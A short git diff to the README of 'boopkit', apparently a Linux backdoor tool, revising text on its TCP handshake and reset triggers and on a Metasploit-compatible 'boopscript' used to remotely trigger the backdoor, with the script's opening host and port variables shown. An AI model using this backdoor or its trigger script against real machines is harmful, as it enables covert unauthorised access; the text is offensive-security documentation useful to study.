@@ -154,13 +154,14 @@ The 2nd handshake will flip the TCP reset flag in the packet, trigger a TCP rese
 
 Either of these tactics are enough to independently trigger boopkit.
 Various network hardware and runtime conditions will make either tactic more viable.
-Boopkit will try both, by default.
+Boopkit will try both, and respond to both by default.
 
 # Boopscript
 
-The `boopscript` file is a [Metasploit](https://github.com/rapid7/metasploit-framework) compatible script that can be used to remotely trigger the boopkit backdoor after `boopkit-boop` is installed locally.
+The `boopscript` file is a [Metasploit](https://github.com/rapid7/metasploit-framework) compatible script that can be used to remotely trigger the boopkit backdoor after `boopkit-boop` is installed on a remote Linux machine.
 
 ```bash
+# boopscript
 RHOST="127.0.0.1"
 RPORT="22"
 LHOST="127.0.0.1"
